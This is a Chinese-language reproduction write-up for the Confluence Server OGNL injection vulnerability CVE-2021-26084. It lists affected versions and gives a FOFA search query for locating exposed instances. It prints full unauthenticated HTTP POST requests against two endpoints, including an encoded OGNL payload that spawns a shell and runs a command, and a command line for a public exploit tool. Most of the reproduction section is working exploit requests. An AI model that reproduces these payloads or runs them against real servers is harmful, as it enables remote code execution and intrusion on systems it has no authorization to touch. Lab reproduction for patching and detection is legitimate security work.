# Confluence OGNL表达式注入代码执行漏洞(CVE-2021-26084)
# 0x00 漏洞描述
 远程攻击者在经过身份验证或在特定环境下未经身份验证的情况下，可构造OGNL表达式进行注入，实现在 Confluence Server或Data Center上执行任意代码.  
# 0x01 影响范围
受影响版本
- Confluence < 6.13.23
- 6.14.0 ≤ Confluence < 7.4.11
- 7.5.0 ≤ Confluence < 7.11.6
- 7.12.0 ≤ Confluence < 7.12.5
- Confluence < 7.13.0

不受影响版本
- Confluence=6.13.23
- Confluence=7.4.11
- Confluence=7.11.6
- Confluence=7.12.5
- Confluence=7.13.0

# 0x02 FOFA DORK
app="ATLASSIAN-Confluence"

# 0x03 环境搭建
- https://github.com/vulhub/vulhub/blob/master/confluence/CVE-2021-26084/README.zh-cn.md

# 0x04 漏洞复现
有多个接口可以触发这个OGNL表达式注入漏洞。

## 4.1 漏洞验证

### /pages/doenterpagevariables.action
这个接口不需要登录即可利用，发送如下数据包，即可看到`233*233`已被执行：

```
POST /pages/doenterpagevariables.action HTTP/1.1
Host: your-ip:8090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 47

queryString=%5cu0027%2b%7b233*233%7d%2b%5cu0027
```

![image](https://user-images.githubusercontent.com/84888757/172718975-4a01ef56-de09-4c7c-9f3b-f4c85cd6c0c9.png)

### /pages/createpage-entervariables.action
这个路径也不需要用户登录：
```
POST /pages/createpage-entervariables.action HTTP/1.1
Host: your-ip:8090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 47

queryString=%5cu0027%2b%7b233*233%7d%2b%5cu0027
```


## 4.1 命令执行
```
POST /pages/doenterpagevariables.action HTTP/1.1
Host: 192.168.50.227:8090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 1060

queryString=%5cu0027%2b%7bClass.forName%28%5cu0027javax.script.ScriptEngineManager%5cu0027%29.newInstance%28%29.getEngineByName%28%5cu0027JavaScript%5cu0027%29.%5cu0065val%28%5cu0027var+isWin+%3d+java.lang.System.getProperty%28%5cu0022os.name%5cu0022%29.toLowerCase%28%29.contains%28%5cu0022win%5cu0022%29%3b+var+cmd+%3d+new+java.lang.String%28%5cu0022id%5cu0022%29%3bvar+p+%3d+new+java.lang.ProcessBuilder%28%29%3b+if%28isWin%29%7bp.command%28%5cu0022cmd.exe%5cu0022%2c+%5cu0022%2fc%5cu0022%2c+cmd%29%3b+%7d+else%7bp.command%28%5cu0022bash%5cu0022%2c+%5cu0022-c%5cu0022%2c+cmd%29%3b+%7dp.redirectErrorStream%28true%29%3b+var+process%3d+p.start%28%29%3b+var+inputStreamReader+%3d+new+java.io.InputStreamReader%28process.getInputStream%28%29%29%3b+var+bufferedReader+%3d+new+java.io.BufferedReader%28inputStreamReader%29%3b+var+line+%3d+%5cu0022%5cu0022%3b+var+output+%3d+%5cu0022%5cu0022%3b+while%28%28line+%3d+bufferedReader.readLine%28%29%29+%21%3d+null%29%7boutput+%3d+output+%2b+line+%2b+java.lang.Character.toString%2810%29%3b+%7d%5cu0027%29%7d%2b%5cu0027
```

![image](https://user-images.githubusercontent.com/84888757/172719831-de3f7df2-4614-4a5c-b2fc-9d872436ac2d.png)


- 🔗 [工具链接 @h3v0x](https://github.com/h3v0x/CVE-2021-26084_Confluence/)
```
python3 Confluence_OGNLInjection.py -u http://xxxxx.com -p /pages/createpage-entervariables.action?SpaceKey=x
```

![image](https://user-images.githubusercontent.com/84888757/172717876-4fcf9bb4-0117-459e-8464-74f4b517ae36.png)

# 0x05 参考链接
- https://github.com/h3v0x/CVE-2021-26084_Confluence/
- https://github.com/vulhub/vulhub/blob/master/confluence/CVE-2021-26084/README.zh-cn.md
